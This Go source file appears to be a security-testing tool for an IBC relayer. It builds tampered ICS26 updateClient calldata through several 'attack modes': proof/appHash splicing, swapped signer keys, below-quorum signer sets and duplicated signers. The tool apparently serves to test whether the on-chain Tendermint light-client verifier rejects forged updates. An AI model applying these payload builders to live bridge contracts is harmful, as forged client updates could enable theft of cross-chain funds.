package main

import (
	"bytes"
	"context"
	"encoding/hex"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"log"
	"math/big"
	"os"
	"sort"
	"strings"

	contractICS26Router "relayer/bindings/ICS26Router"
	contractUpdateClient "relayer/bindings/UpdateClient"
	"relayer/prover"
	"relayer/services"

	rpchttp "github.com/cometbft/cometbft/rpc/client/http"
	ibcexported "github.com/cosmos/ibc-go/v10/modules/core/exported"
	"github.com/ethereum/go-ethereum"
	"github.com/ethereum/go-ethereum/accounts/abi"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/ethclient"
)

type output struct {
	Mode              string `json:"mode"`
	BaseSource        string `json:"base_source,omitempty"`
	BaseTx            string `json:"base_tx,omitempty"`
	DonorTx           string `json:"donor_tx,omitempty"`
	ClientID          string `json:"client_id"`
	Mutation          string `json:"mutation"`
	BaseAppHash       string `json:"base_app_hash,omitempty"`
	DonorAppHash      string `json:"donor_app_hash,omitempty"`
	TamperedCalldata  string `json:"tampered_calldata,omitempty"`
	Bucket            uint16 `json:"bucket,omitempty"`
	ValidatorCount    int    `json:"validator_count,omitempty"`
	ActiveCount       int    `json:"active_count,omitempty"`
	UniqueActive      int    `json:"unique_active,omitempty"`
	ActivePower       uint64 `json:"active_power,omitempty"`
	TotalPower        uint64 `json:"total_power,omitempty"`
	MinSignersFor2of3 int    `json:"min_signers_for_2of3,omitempty"`
	QuorumSatisfied   bool   `json:"quorum_satisfied,omitempty"`
	TrustedHeight     uint64 `json:"trusted_height,omitempty"`
	ProposedHeight    uint64 `json:"proposed_height,omitempty"`
}

type txData struct {
	TxHash    common.Hash
	ClientID  string
	UpdateMsg contractUpdateClient.IUpdateClientMsgsMsgUpdateClient
}

type cosmosToEthConfig struct {
	TmRpcUrl           string `json:"tm_rpc_url"`
	ICS26Address       string `json:"ics26_address"`
	ICS26ClientID      string `json:"ics26_client_id"`
	EthRpcUrl          string `json:"eth_rpc_url"`
	ICS07Client        string `json:"ics07_client"`
	WrapperVerifier    string `json:"wrapper_verifier"`
	Membership         string `json:"membership"`
	Misbehaviour       string `json:"misbehaviour"`
	UpdateClient       string `json:"update_client"`
	CosmosWasmClientID string `json:"cosmos_wasm_client_id"`
}

type configModule struct {
	Name   string          `json:"name"`
	Config json.RawMessage `json:"config"`
}

type rootConfig struct {
	Modules []configModule `json:"modules"`
}

func main() {
	var (
		mode          = flag.String("mode", "4b", "attack mode: 4b,4c,5a,5b,5c,5d")
		rpcURL        = flag.String("rpc-url", "", "ethereum rpc url")
		router        = flag.String("router", "", "ics26 router address")
		lookback      = flag.Uint64("lookback", 5000, "blocks to scan for ICS02ClientUpdated logs")
		baseTxHash    = flag.String("base-tx", "", "base updateClient tx hash")
		donorTxHash   = flag.String("donor-tx", "", "donor updateClient tx hash (required for 4b unless auto-detected)")
		baseBlockHint = flag.Uint64("from-block", 0, "optional explicit start block")
		fresh         = flag.Bool("fresh", false, "build a fresh update payload from current chain state (5a/5b only)")
		configPath    = flag.String("config", "config.example.json", "path to relayer JSON config (used by --fresh)")
		proverBinDir  = flag.String("prover-bin-dir", "", "prover artifacts dir (default: PROVER_BIN_DIR or ./bin; used by --fresh)")
		proofType     = flag.String("proof-type", "groth16", "proof type for fresh payload generation")
		trustLevel    = flag.String("trust-level", "1/3", "trust level for fresh payload generation")
	)
	flag.Parse()

	modeVal := strings.ToLower(*mode)
	if modeVal != "4b" && modeVal != "4c" && modeVal != "5a" && modeVal != "5b" && modeVal != "5c" && modeVal != "5d" {
		log.Fatal("--mode must be one of: 4b,4c,5a,5b,5c,5d")
	}
	if *fresh && modeVal != "5a" && modeVal != "5b" {
		log.Fatal("--fresh currently supports only modes 5a and 5b")
	}

	var (
		cfg                cosmosToEthConfig
		err                error
		resolvedRPCURL     = *rpcURL
		resolvedRouterAddr = *router
	)
	if *fresh {
		cfg, err = loadCosmosToEthConfig(*configPath)
		if err != nil {
			log.Fatalf("load config for --fresh: %v", err)
		}
		if resolvedRPCURL == "" {
			resolvedRPCURL = cfg.EthRpcUrl
		}
		if resolvedRouterAddr == "" {
			resolvedRouterAddr = cfg.ICS26Address
		}
	}
	if resolvedRPCURL == "" {
		log.Fatal("--rpc-url is required (or provide via --config when using --fresh)")
	}
	if !common.IsHexAddress(resolvedRouterAddr) {
		log.Fatal("--router must be a valid hex address (or provide via --config when using --fresh)")
	}

	ctx := context.Background()
	routerAddr := common.HexToAddress(resolvedRouterAddr)
	routerABI, err := contractICS26Router.ContractICS26RouterMetaData.GetAbi()
	if err != nil || routerABI == nil {
		log.Fatalf("load ICS26 router ABI: %v", err)
	}
	updateABI, err := contractUpdateClient.ContractUpdateClientMetaData.GetAbi()
	if err != nil || updateABI == nil {
		log.Fatalf("load UpdateClient ABI: %v", err)
	}

	var (
		baseData txData
		donorTx  common.Hash
	)
	if *fresh {
		baseData, err = buildFreshBaseData(ctx, cfg, resolvedRPCURL, resolvedRouterAddr, *proverBinDir, *proofType, *trustLevel)
		if err != nil {
			log.Fatalf("build fresh payload: %v", err)
		}
	} else {
		client, err := ethclient.DialContext(ctx, resolvedRPCURL)
		if err != nil {
			log.Fatalf("dial rpc: %v", err)
		}
		defer client.Close()

		baseTx, resolvedDonorTx, err := resolveTxHashes(
			ctx,
			client,
			routerABI.Events["ICS02ClientUpdated"].ID,
			routerAddr,
			*lookback,
			*baseBlockHint,
			*baseTxHash,
			*donorTxHash,
			modeVal,
		)
		if err != nil {
			log.Fatal(err)
		}
		donorTx = resolvedDonorTx

		baseData, err = decodeUpdateTx(ctx, client, routerABI, updateABI, baseTx)
		if err != nil {
			log.Fatalf("decode base tx: %v", err)
		}
	}

	out := output{
		Mode:           modeVal,
		BaseSource:     "historical_tx",
		ClientID:       baseData.ClientID,
		TrustedHeight:  baseData.UpdateMsg.ClientState.LatestHeight.RevisionHeight,
		ProposedHeight: baseData.UpdateMsg.ProposedHeader.SignedHeader.Header.Height,
	}
	if baseData.TxHash != (common.Hash{}) {
		out.BaseTx = baseData.TxHash.Hex()
	}
	if *fresh {
		out.BaseSource = "fresh_pre_update_payload"
	}
	stats := computeQuorumStats(baseData.UpdateMsg)
	out.Bucket = baseData.UpdateMsg.Bucket
	out.ValidatorCount = stats.ValidatorCount
	out.ActiveCount = stats.ActiveCount
	out.UniqueActive = stats.UniqueActive
	out.ActivePower = stats.ActivePower
	out.TotalPower = stats.TotalPower
	out.MinSignersFor2of3 = stats.MinSignersFor2of3
	out.QuorumSatisfied = stats.QuorumSatisfied

	var tamperedMsg contractUpdateClient.IUpdateClientMsgsMsgUpdateClient
	needsCalldata := true

	switch modeVal {
	case "4b":
		client, err := ethclient.DialContext(ctx, resolvedRPCURL)
		if err != nil {
			log.Fatalf("dial rpc: %v", err)
		}
		defer client.Close()

		donorData, err := decodeUpdateTx(ctx, client, routerABI, updateABI, donorTx)
		if err != nil {
			log.Fatalf("decode donor tx: %v", err)
		}
		if donorData.ClientID != baseData.ClientID {
			log.Fatalf("client id mismatch between donor(%s) and base(%s)", donorData.ClientID, baseData.ClientID)
		}

		tamperedMsg = donorData.UpdateMsg
		oldHash := tamperedMsg.ProposedHeader.SignedHeader.Header.AppHash
		newHash := baseData.UpdateMsg.ProposedHeader.SignedHeader.Header.AppHash

		if oldHash == newHash {
			log.Fatal("donor and base appHash are identical; choose txs from different heights")
		}

		tamperedMsg.ProposedHeader.SignedHeader.Header.AppHash = newHash
		out.DonorTx = donorData.TxHash.Hex()
		out.DonorAppHash = common.BytesToHash(oldHash[:]).Hex()
		out.BaseAppHash = common.BytesToHash(newHash[:]).Hex()
		out.Mutation = "4b: donor proof with base appHash (witness mismatch)"

	case "4c":
		tamperedMsg = baseData.UpdateMsg
		i, j, ok := findDistinctPubkeyPair(tamperedMsg.SignerPubkeys)
		if !ok {
			log.Fatal("unable to find two distinct signer pubkeys in base tx; try another tx via --base-tx")
		}
		tamperedMsg.SignerPubkeys[i], tamperedMsg.SignerPubkeys[j] = tamperedMsg.SignerPubkeys[j], tamperedMsg.SignerPubkeys[i]
		out.Mutation = fmt.Sprintf("4c: swapped signerPubkeys[%d] and signerPubkeys[%d]", i, j)

	case "5a":
		tamperedMsg = baseData.UpdateMsg
		accumulated, enabled, err := reduceToBelowQuorum(&tamperedMsg)
		if err != nil {
			log.Fatalf("build 5a payload: %v", err)
		}
		out.Mutation = fmt.Sprintf("5a: reduced active signers to %d, accumulated power=%d (below strict 2/3)", enabled, accumulated)

	case "5b":
		tamperedMsg = baseData.UpdateMsg
		i, j, idx, err := makeDuplicateSignerPayload(&tamperedMsg)
		if err != nil {
			log.Fatalf("build 5b payload: %v", err)
		}
		out.Mutation = fmt.Sprintf("5b: duplicated signer index %d by mapping active slot %d onto slot %d", idx, i, j)

	case "5c":
		needsCalldata = false
		out.Mutation = "5c: state check only (exact bucket boundary)"

	case "5d":
		needsCalldata = false
		out.Mutation = "5d: state check only (requires signer count > largest bucket)"
	}

	if needsCalldata {
		tamperedBytes, err := updateABI.Methods["updateClient"].Inputs.Pack(tamperedMsg)
		if err != nil {
			log.Fatalf("pack tampered updateMsg: %v", err)
		}

		callData, err := routerABI.Pack("updateClient", baseData.ClientID, tamperedBytes)
		if err != nil {
			log.Fatalf("pack ICS26 updateClient calldata: %v", err)
		}

		out.TamperedCalldata = "0x" + hex.EncodeToString(callData)
	}

	enc := json.NewEncoder(os.Stdout)
	enc.SetIndent("", "  ")
	if err := enc.Encode(out); err != nil {
		log.Fatalf("encode output: %v", err)
	}
}

func resolveTxHashes(
	ctx context.Context,
	client *ethclient.Client,
	topic common.Hash,
	router common.Address,
	lookback uint64,
	fromBlockHint uint64,
	baseTxRaw string,
	donorTxRaw string,
	mode string,
) (common.Hash, common.Hash, error) {
	var baseTx, donorTx common.Hash
	var err error

	if baseTxRaw != "" {
		baseTx, err = parseTxHash(baseTxRaw)
		if err != nil {
			return common.Hash{}, common.Hash{}, fmt.Errorf("invalid --base-tx: %w", err)
		}
	}
	if donorTxRaw != "" {
		donorTx, err = parseTxHash(donorTxRaw)
		if err != nil {
			return common.Hash{}, common.Hash{}, fmt.Errorf("invalid --donor-tx: %w", err)
		}
	}

	if baseTxRaw != "" && (mode == "4c" || mode == "5a" || mode == "5b" || mode == "5c" || mode == "5d" || donorTxRaw != "") {
		return baseTx, donorTx, nil
	}

	latest, err := client.BlockNumber(ctx)
	if err != nil {
		return common.Hash{}, common.Hash{}, fmt.Errorf("get latest block: %w", err)
	}
	from := uint64(0)
	if fromBlockHint > 0 {
		from = fromBlockHint
	} else if latest > lookback {
		from = latest - lookback
	}

	logs, err := client.FilterLogs(ctx, ethereum.FilterQuery{
		FromBlock: new(big.Int).SetUint64(from),
		ToBlock:   nil,
		Addresses: []common.Address{router},
		Topics:    [][]common.Hash{{topic}},
	})
	if err != nil {
		return common.Hash{}, common.Hash{}, fmt.Errorf("filter ICS02ClientUpdated logs: %w", err)
	}
	if len(logs) == 0 {
		return common.Hash{}, common.Hash{}, fmt.Errorf("no ICS02ClientUpdated logs found in [%d, latest]", from)
	}

	latestLog := logs[len(logs)-1]
	prevLog := types.Log{}
	hasPrev := len(logs) >= 2
	if hasPrev {
		prevLog = logs[len(logs)-2]
	}

	if (baseTx == common.Hash{}) {
		baseTx = latestLog.TxHash
	}
	if mode == "4b" && (donorTx == common.Hash{}) {
		if !hasPrev {
			return common.Hash{}, common.Hash{}, errors.New("4b requires at least two ICS02ClientUpdated txs in lookback window; provide --donor-tx or increase --lookback")
		}
		donorTx = prevLog.TxHash
	}

	return baseTx, donorTx, nil
}

func loadCosmosToEthConfig(path string) (cosmosToEthConfig, error) {
	raw, err := os.ReadFile(path)
	if err != nil {
		return cosmosToEthConfig{}, fmt.Errorf("read config %s: %w", path, err)
	}

	var root rootConfig
	if err := json.Unmarshal(raw, &root); err != nil {
		return cosmosToEthConfig{}, fmt.Errorf("parse config %s: %w", path, err)
	}

	for _, m := range root.Modules {
		if m.Name != "cosmos_to_eth" {
			continue
		}
		var cfg cosmosToEthConfig
		if err := json.Unmarshal(m.Config, &cfg); err != nil {
			return cosmosToEthConfig{}, fmt.Errorf("parse cosmos_to_eth config: %w", err)
		}
		return cfg, nil
	}
	return cosmosToEthConfig{}, errors.New("module cosmos_to_eth not found in config")
}

func buildFreshBaseData(
	ctx context.Context,
	cfg cosmosToEthConfig,
	rpcURL string,
	routerAddress string,
	proverBinDir string,
	proofType string,
	trustLevel string,
) (txData, error) {
	if cfg.TmRpcUrl == "" {
		return txData{}, errors.New("tm_rpc_url is required in cosmos_to_eth config for --fresh")
	}
	if !common.IsHexAddress(cfg.ICS07Client) {
		return txData{}, fmt.Errorf("invalid ics07_client address in config: %s", cfg.ICS07Client)
	}
	if cfg.ICS26ClientID == "" {
		return txData{}, errors.New("ics26_client_id is required in cosmos_to_eth config for --fresh")
	}
	if proverBinDir == "" {
		proverBinDir = os.Getenv("PROVER_BIN_DIR")
		if proverBinDir == "" {
			proverBinDir = "./bin"
		}
	}

	cosmosClient, err := rpchttp.New(cfg.TmRpcUrl, "/websocket")
	if err != nil {
		return txData{}, fmt.Errorf("create cosmos rpc client: %w", err)
	}

	ethClient, err := ethclient.DialContext(ctx, rpcURL)
	if err != nil {
		return txData{}, fmt.Errorf("dial eth rpc: %w", err)
	}
	defer ethClient.Close()

	p, err := prover.NewProver(proverBinDir)
	if err != nil {
		return txData{}, fmt.Errorf("load prover artifacts from %s: %w", proverBinDir, err)
	}
	txCapture := &captureTxHandler{}
	worker := services.NewWorker(txCapture, p)

	svcCtx := services.NewCtx(cosmosClient, ethClient)
	router := chooseFirstNonEmpty(routerAddress, cfg.ICS26Address)
	svcCtx.SetAddresses(
		router,
		chooseFirstNonEmpty(cfg.WrapperVerifier, router),
		chooseFirstNonEmpty(cfg.Membership, router),
		chooseFirstNonEmpty(cfg.Misbehaviour, router),
		chooseFirstNonEmpty(cfg.UpdateClient, router),
		router,
	)
	svcCtx.SetClient(common.HexToAddress(cfg.ICS07Client))
	svcCtx.SetCosmosRouterClientID(cfg.ICS26ClientID)
	svcCtx.SetEthClientID(chooseFirstNonEmpty(cfg.CosmosWasmClientID, "08-wasm-0"))

	if _, err := worker.UpdateCosmosClient(svcCtx, proofType, 0, trustLevel); err != nil {
		return txData{}, err
	}
	if txCapture.msg == nil {
		return txData{}, errors.New("no fresh update payload captured (client may already be up to date; wait for a new Cosmos block and retry)")
	}

	return txData{
		ClientID:  cfg.ICS26ClientID,
		UpdateMsg: *txCapture.msg,
	}, nil
}

func chooseFirstNonEmpty(values ...string) string {
	for _, v := range values {
		if v != "" {
			return v
		}
	}
	return ""
}

func parseTxHash(s string) (common.Hash, error) {
	if !common.IsHexHash(s) {
		return common.Hash{}, errors.New("not a valid 0x-prefixed 32-byte hash")
	}
	return common.HexToHash(s), nil
}

func decodeUpdateTx(
	ctx context.Context,
	client *ethclient.Client,
	routerABI *abi.ABI,
	updateABI *abi.ABI,
	txHash common.Hash,
) (txData, error) {
	tx, _, err := client.TransactionByHash(ctx, txHash)
	if err != nil {
		return txData{}, fmt.Errorf("fetch tx %s: %w", txHash.Hex(), err)
	}
	data := tx.Data()
	if len(data) < 4 {
		return txData{}, fmt.Errorf("tx %s has short calldata", txHash.Hex())
	}

	updateMethod := routerABI.Methods["updateClient"]
	if !bytes.Equal(data[:4], updateMethod.ID) {
		return txData{}, fmt.Errorf("tx %s is not ICS26.updateClient", txHash.Hex())
	}

	args, err := updateMethod.Inputs.Unpack(data[4:])
	if err != nil {
		return txData{}, fmt.Errorf("unpack ICS26 updateClient args: %w", err)
	}
	if len(args) != 2 {
		return txData{}, fmt.Errorf("unexpected ICS26.updateClient arg count: %d", len(args))
	}

	clientID, ok := args[0].(string)
	if !ok {
		return txData{}, errors.New("clientId arg is not string")
	}
	updateMsgBytes, ok := args[1].([]byte)
	if !ok {
		return txData{}, errors.New("updateMsg arg is not bytes")
	}

	msgMethod := updateABI.Methods["updateClient"]
	msgArgs, err := msgMethod.Inputs.Unpack(updateMsgBytes)
	if err != nil {
		return txData{}, fmt.Errorf("unpack inner MsgUpdateClient bytes: %w", err)
	}
	if len(msgArgs) != 1 {
		return txData{}, fmt.Errorf("unexpected MsgUpdateClient arg count: %d", len(msgArgs))
	}

	msg := *abi.ConvertType(msgArgs[0], new(contractUpdateClient.IUpdateClientMsgsMsgUpdateClient)).(*contractUpdateClient.IUpdateClientMsgsMsgUpdateClient)

	return txData{
		TxHash:    txHash,
		ClientID:  clientID,
		UpdateMsg: msg,
	}, nil
}

func findDistinctPubkeyPair(pubkeys [][32]byte) (int, int, bool) {
	for i := 0; i < len(pubkeys); i++ {
		for j := i + 1; j < len(pubkeys); j++ {
			if pubkeys[i] != pubkeys[j] {
				return i, j, true
			}
		}
	}
	return 0, 0, false
}

type quorumStats struct {
	ValidatorCount    int
	ActiveCount       int
	UniqueActive      int
	ActivePower       uint64
	TotalPower        uint64
	MinSignersFor2of3 int
	QuorumSatisfied   bool
}

func computeQuorumStats(msg contractUpdateClient.IUpdateClientMsgsMsgUpdateClient) quorumStats {
	vals := msg.ProposedHeader.ValidatorSet.Validators
	seen := make(map[uint32]struct{}, len(vals))

	var activeCount int
	var uniqueActive int
	var activePower uint64

	for i := 0; i < len(msg.SignerIndices) && i < len(msg.Active); i++ {
		if !msg.Active[i] {
			continue
		}
		activeCount++
		idx := msg.SignerIndices[i]
		if int(idx) >= len(vals) {
			continue
		}
		if _, ok := seen[idx]; ok {
			continue
		}
		seen[idx] = struct{}{}
		uniqueActive++
		activePower += vals[idx].VotingPower
	}

	total := msg.ProposedHeader.ValidatorSet.TotalVotingPower
	return quorumStats{
		ValidatorCount:    len(vals),
		ActiveCount:       activeCount,
		UniqueActive:      uniqueActive,
		ActivePower:       activePower,
		TotalPower:        total,
		MinSignersFor2of3: minSignersForStrictTwoThirds(vals, total),
		QuorumSatisfied:   uint256Mul3GT2(activePower, total),
	}
}

func uint256Mul3GT2(a, b uint64) bool {
	return uint64ToBig(a).Mul(uint64ToBig(a), big.NewInt(3)).Cmp(uint64ToBig(b).Mul(uint64ToBig(b), big.NewInt(2))) > 0
}

func uint64ToBig(v uint64) *big.Int {
	return new(big.Int).SetUint64(v)
}

func minSignersForStrictTwoThirds(vals []contractUpdateClient.IICS07TendermintMsgsValidatorInfo, total uint64) int {
	if len(vals) == 0 {
		return 0
	}
	powers := make([]uint64, 0, len(vals))
	for _, v := range vals {
		powers = append(powers, v.VotingPower)
	}
	sort.Slice(powers, func(i, j int) bool { return powers[i] > powers[j] })
	var sum uint64
	for i, p := range powers {
		sum += p
		if uint256Mul3GT2(sum, total) {
			return i + 1
		}
	}
	return len(vals) + 1
}

func reduceToBelowQuorum(msg *contractUpdateClient.IUpdateClientMsgsMsgUpdateClient) (uint64, int, error) {
	vals := msg.ProposedHeader.ValidatorSet.Validators
	type slotPower struct {
		slot  int
		power uint64
	}
	slots := make([]slotPower, 0, len(msg.SignerIndices))
	for i := 0; i < len(msg.SignerIndices) && i < len(msg.Active); i++ {
		if !msg.Active[i] {
			continue
		}
		idx := msg.SignerIndices[i]
		if int(idx) >= len(vals) {
			continue
		}
		slots = append(slots, slotPower{slot: i, power: vals[idx].VotingPower})
	}
	if len(slots) == 0 {
		return 0, 0, errors.New("no active slots in base payload")
	}
	sort.Slice(slots, func(i, j int) bool { return slots[i].power > slots[j].power })

	for i := range msg.Active {
		msg.Active[i] = false
	}
	var acc uint64
	enabled := 0
	total := msg.ProposedHeader.ValidatorSet.TotalVotingPower
	for _, s := range slots {
		next := acc + s.power
		if uint256Mul3GT2(next, total) {
			continue
		}
		msg.Active[s.slot] = true
		acc = next
		enabled++
	}
	if enabled == 0 {
		// fallback: try weakest signer, unless even that alone is >2/3
		weakest := slots[len(slots)-1]
		if uint256Mul3GT2(weakest.power, total) {
			return 0, 0, errors.New("cannot construct below-quorum set: single signer already exceeds 2/3")
		}
		msg.Active[weakest.slot] = true
		return weakest.power, 1, nil
	}
	return acc, enabled, nil
}

func makeDuplicateSignerPayload(msg *contractUpdateClient.IUpdateClientMsgsMsgUpdateClient) (int, int, uint32, error) {
	activeSlots := make([]int, 0, len(msg.SignerIndices))
	for i := 0; i < len(msg.SignerIndices) && i < len(msg.Active); i++ {
		if msg.Active[i] {
			activeSlots = append(activeSlots, i)
		}
	}
	if len(activeSlots) < 2 {
		return 0, 0, 0, errors.New("need at least two active slots to build duplicate signer case")
	}
	i := activeSlots[0]
	j := activeSlots[1]
	dupIdx := msg.SignerIndices[i]
	msg.SignerIndices[j] = dupIdx
	msg.SignerPubkeys[j] = msg.SignerPubkeys[i]
	msg.Active[j] = true
	return i, j, dupIdx, nil
}

type captureTxHandler struct {
	msg *contractUpdateClient.IUpdateClientMsgsMsgUpdateClient
}

func (h *captureTxHandler) CreateCosmosClientContract(ctx services.Context, clientState, consensusHash []byte) (common.Address, error) {
	return common.Address{}, errors.New("not implemented")
}

func (h *captureTxHandler) CreateEthClient(ctx services.Context, clientState ibcexported.ClientState, consensusState ibcexported.ConsensusState) (string, error) {
	return "", errors.New("not implemented")
}

func (h *captureTxHandler) SendEthTx(ctx services.Context, msg any) error {
	updateMsg, ok := msg.(contractUpdateClient.IUpdateClientMsgsMsgUpdateClient)
	if !ok {
		return fmt.Errorf("unexpected eth message type: %T", msg)
	}
	copied := updateMsg
	h.msg = &copied
	return nil
}

func (h *captureTxHandler) SendCosmosTx(ctx services.Context, msg any) error {
	return errors.New("not implemented")
}

func (h *captureTxHandler) SendCosmosTxBatch(ctx services.Context, msgs []any) error {
	return errors.New("not implemented")
}

func (h *captureTxHandler) CosmosSignerAddress() (string, error) {
	return "", errors.New("not implemented")
}
